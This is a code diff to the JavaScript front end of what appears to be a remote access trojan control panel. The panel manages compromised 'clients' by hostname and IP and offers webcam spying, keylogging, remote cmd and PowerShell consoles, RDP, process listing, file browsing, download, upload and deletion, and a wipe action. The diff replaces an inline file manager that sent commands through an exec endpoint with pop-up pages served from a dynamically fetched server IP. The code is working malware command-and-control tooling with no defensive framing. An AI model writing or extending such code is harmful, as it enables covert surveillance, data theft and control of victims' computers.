@@ -264,232 +264,57 @@ async function loadUploads(clientId, container) {
   });
 }
 
-// ---------- FILE MANAGER ----------
-async function runFileOp(clientId, action, path, extra = {}) {
-  const payload = JSON.stringify({ action, path, ...extra });
-  const r = await fetch(`/api/clients/${clientId}/exec`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ shell: 'file', line: payload }),
-  });
-  if (!r.ok) {
-    const d = await r.json().catch(() => ({}));
-    throw new Error(d.error || `http ${r.status}`);
-  }
-  const d = await r.json();
-  if (d.error) throw new Error(d.error);
-  if (!d.commandId) throw new Error('no commandId returned');
-
-  const cmdId = d.commandId;
-  const deadline = Date.now() + 120_000;
-  while (Date.now() < deadline) {
-    await new Promise(res => setTimeout(res, 500));
-    try {
-      const rows = await (await fetch(`/api/clients/${clientId}/commands`)).json();
-      const c = rows.find(x => x.id === cmdId);
-      if (c && c.status === 'done') return c.output || '';
-    } catch {}
-  }
-  throw new Error('timeout — client did not respond');
+// ---------- REMOTE OPENER (Dynamic IP) ----------
+async function getRemoteIp() {
+  try {
+    const r = await fetch('/api/remote_ip');
+    if (!r.ok) return null;
+    const d = await r.json();
+    return d.ip;
+  } catch { return null; }
 }
 
-let fileClient = null;
-let filePath = 'C:\\';
+async function openConsole(c, shell) {
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
+  window.open(`http://${ip}:3000/cmd.html?` + q.toString(), '_blank', 'width=1000,height=640');
+}
+
+async function openRdp(c) {
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open(`http://${ip}:3000/rdp.html?` + q.toString(), '_blank', 'width=1200,height=760');
+}
+
+async function openWebcam(c) {
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open(`http://${ip}:3000/webcam.html?` + q.toString(), '_blank', 'width=1000,height=700');
+}
+
+async function openKeylog(c) {
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open(`http://${ip}:3000/keylog.html?` + q.toString(), '_blank', 'width=1000,height=700');
+}
+
+async function openProcs(c) {
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open(`http://${ip}:3000/procs.html?` + q.toString(), '_blank', 'width=1100,height=800');
+}
 
 async function openFileManager(c) {
-  fileClient = c;
-  filePath = 'C:\\';
-  $('drawer-title').textContent = `Files: ${c.hostname}`;
-  $('drawer').classList.add('open');
-  $('drawer-backdrop').classList.add('open');
-  await renderFileList();
-}
-
-async function renderFileList() {
-  const box = $('drawer-content');
-  box.innerHTML = `
-    <div style="display:flex;gap:8px;margin-bottom:16px;">
-      <button class="ghost mini" id="file-up">up</button>
-      <input id="file-path" value="${esc(filePath)}" style="flex:1;padding:6px 12px;font-size:13px;font-family:var(--mono);">
-      <button class="ghost mini" id="file-go">go</button>
-      <button class="ghost mini" id="file-upload-btn" style="border-color:var(--green);color:var(--green)">upload</button>
-      <input type="file" id="file-upload-input" style="display:none">
-    </div>
-    <div id="file-list" style="display:flex;flex-direction:column;gap:6px;">
-      <div class="note">loading…</div>
-    </div>
-  `;
-
-  const joinPath = (base, name) => base.endsWith('\\') ? base + name : base + '\\' + name;
-
-  const updateList = async () => {
-    $('file-path').value = filePath;
-    $('file-list').innerHTML = '<div class="note">loading…</div>';
-
-    let res;
-    try {
-      res = await runFileOp(fileClient.id, 'list', filePath);
-    } catch (e) {
-      $('file-list').innerHTML = `<div class="err">failed: ${esc(e.message)}</div>`;
-      return;
-    }
-
-    if (!res || !res.startsWith('b64:')) {
-      $('file-list').innerHTML = `<div class="err">failed: ${esc(res || 'no response')}</div>`;
-      return;
-    }
-
-    let data;
-    try { data = JSON.parse(atob(res.slice(4))); }
-    catch { $('file-list').innerHTML = '<div class="err">bad payload from client</div>'; return; }
-
-    if (!data.ok) {
-      $('file-list').innerHTML = '<div class="err">failed to list dir</div>';
-      return;
-    }
-
-    const list = $('file-list');
-    list.innerHTML = '';
-
-    if (data.items.length === 0) {
-      list.innerHTML = '<div class="note">folder is empty</div>';
-      return;
-    }
-
-    data.items.sort((a, b) => {
-      if (a.dir && !b.dir) return -1;
-      if (!a.dir && b.dir) return 1;
-      return a.name.localeCompare(b.name);
-    });
-
-    data.items.forEach(item => {
-      const full = joinPath(filePath, item.name);
-      const row = document.createElement('div');
-      row.style.cssText = "display:flex; justify-content:space-between; align-items:center; padding:8px 12px; background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); font-size:13px; cursor:pointer;";
-      row.innerHTML = `
-        <div style="display:flex; align-items:center; gap:10px; overflow:hidden; min-width:0;">
-          <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;flex-shrink:0; stroke:${item.dir ? 'var(--accent)' : 'var(--muted)'};">
-            ${item.dir
-              ? '<path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>'
-              : '<path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/>'}
-          </svg>
-          <span style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${esc(item.name)}</span>
-        </div>
-        <div style="display:flex; gap:6px; align-items:center; flex-shrink:0;">
-          <span style="color:var(--muted); font-size:11px; font-family:var(--mono); min-width:60px; text-align:right;">${item.dir ? 'DIR' : humanSize(item.size)}</span>
-          <span class="fm-actions"></span>
-        </div>
-      `;
-
-      const actions = row.querySelector('.fm-actions');
-
-      if (!item.dir) {
-        const dl = document.createElement('button');
-        dl.className = 'ghost mini';
-        dl.textContent = '↓';
-        dl.title = 'download';
-        dl.style.cssText = 'padding:2px 8px; min-width:26px;';
-        dl.addEventListener('click', async (e) => {
-          e.stopPropagation();
-          dl.disabled = true; dl.textContent = '…';
-          try {
-            const b64 = await runFileOp(fileClient.id, 'download', full);
-            if (!b64.startsWith('b64:')) throw new Error(b64);
-            const bin = atob(b64.slice(4));
-            const bytes = new Uint8Array(bin.length);
-            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-            const blob = new Blob([bytes], { type: 'application/octet-stream' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = item.name;
-            document.body.appendChild(a); a.click(); a.remove();
-            setTimeout(() => URL.revokeObjectURL(url), 2000);
-            dl.textContent = '✓';
-          } catch { dl.textContent = '!'; }
-          setTimeout(() => { dl.textContent = '↓'; dl.disabled = false; }, 1000);
-        });
-        actions.appendChild(dl);
-      }
-
-      const del = document.createElement('button');
-      del.className = 'ghost mini';
-      del.textContent = '✕';
-      del.title = 'delete';
-      del.style.cssText = 'padding:2px 8px; min-width:26px; border-color:rgba(248,113,113,.35); color:var(--red);';
-      del.addEventListener('click', async (e) => {
-        e.stopPropagation();
-        if (!confirm(`delete ${item.name}?`)) return;
-        del.disabled = true; del.textContent = '…';
-        try {
-          const out = await runFileOp(fileClient.id, 'delete', full);
-          if (out === 'ok') { updateList(); }
-          else { del.textContent = '!'; }
-        } catch { del.textContent = '!'; }
-        setTimeout(() => { del.textContent = '✕'; del.disabled = false; }, 1000);
-      });
-      actions.appendChild(del);
-
-      row.addEventListener('click', (e) => {
-        if (e.target.closest('button')) return;
-        if (item.dir) {
-          filePath = full;
-          updateList();
-        }
-      });
-
-      list.appendChild(row);
-    });
-  };
-
-  $('file-up').addEventListener('click', () => {
-    if (filePath.length <= 3) return;
-    const parts = filePath.replace(/\\$/, '').split('\\');
-    parts.pop();
-    filePath = parts.join('\\') + '\\';
-    if (filePath === '') filePath = 'C:\\';
-    updateList();
-  });
-
-  $('file-go').addEventListener('click', () => {
-    filePath = $('file-path').value || 'C:\\';
-    updateList();
-  });
-
-  $('file-path').addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') { filePath = $('file-path').value || 'C:\\'; updateList(); }
-  });
-
-  $('file-upload-btn').addEventListener('click', () => $('file-upload-input').click());
-
-  $('file-upload-input').addEventListener('change', async (e) => {
-    const file = e.target.files[0];
-    if (!file) return;
-
-    const btn = $('file-upload-btn');
-    btn.textContent = '…';
-    btn.disabled = true;
-
-    try {
-      const dataUrl = await new Promise((res, rej) => {
-        const rd = new FileReader();
-        rd.onload = () => res(rd.result);
-        rd.onerror = rej;
-        rd.readAsDataURL(file);
-      });
-      const b64 = String(dataUrl).split(',')[1] || '';
-      const out = await runFileOp(fileClient.id, 'upload', filePath, { name: file.name, data: b64 });
-      if (out === 'ok') { updateList(); }
-      else { alert(`upload failed: ${out}`); }
-    } catch (err) {
-      alert(`upload failed: ${err.message}`);
-    } finally {
-      btn.textContent = 'upload';
-      btn.disabled = false;
-      e.target.value = '';
-    }
-  });
-
-  updateList();
+  const ip = await getRemoteIp();
+  if (!ip) return alert('Remote server IP not found');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open(`http://${ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
+  closeDrawer();
 }
 
 function closeDrawer() {
@@ -586,18 +411,18 @@ function openGearMenu(anchor, c) {
   }
 
   menu.querySelectorAll('[data-item]').forEach((el) => {
-    el.addEventListener('click', (ev) => {
+    el.addEventListener('click', async (ev) => {
       ev.stopPropagation();
       closeGearMenu();
       const it = el.dataset.item;
-      if (it === 'rdp') openRdp(c);
-      else if (it === 'webcam') openWebcam(c);
-      else if (it === 'keylog') openKeylog(c);
-      else if (it === 'cmd') openConsole(c, 'cmd');
-      else if (it === 'ps') openConsole(c, 'powershell');
+      if (it === 'rdp') await openRdp(c);
+      else if (it === 'webcam') await openWebcam(c);
+      else if (it === 'keylog') await openKeylog(c);
+      else if (it === 'cmd') await openConsole(c, 'cmd');
+      else if (it === 'ps') await openConsole(c, 'powershell');
       else if (it === 'wipe') wipeClient(c);
-      else if (it === 'files') openFileManager(c);
-      else if (it === 'procs') openProcs(c);
+      else if (it === 'files') await openFileManager(c);
+      else if (it === 'procs') await openProcs(c);
     });
   });
   document.body.appendChild(menu);
@@ -621,30 +446,6 @@ async function wipeClient(c) {
   } else {
     alert(`failed: ${d.error || r.status}`);
   }
-}
-function openConsole(c, shell) {
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
-  window.open('/cmd.html?' + q.toString(), '_blank', 'width=1000,height=640');
-}
-
-function openRdp(c) {
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open('/rdp.html?' + q.toString(), '_blank', 'width=1200,height=760');
-}
-
-function openWebcam(c) {
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open('/webcam.html?' + q.toString(), '_blank', 'width=1000,height=700');
-}
-
-function openKeylog(c) {
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open('/keylog.html?' + q.toString(), '_blank', 'width=1000,height=700');
-}
-
-function openProcs(c) {
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open('/procs.html?' + q.toString(), '_blank', 'width=1100,height=800');
 }
 
 // ---------- toolbar wiring ----------
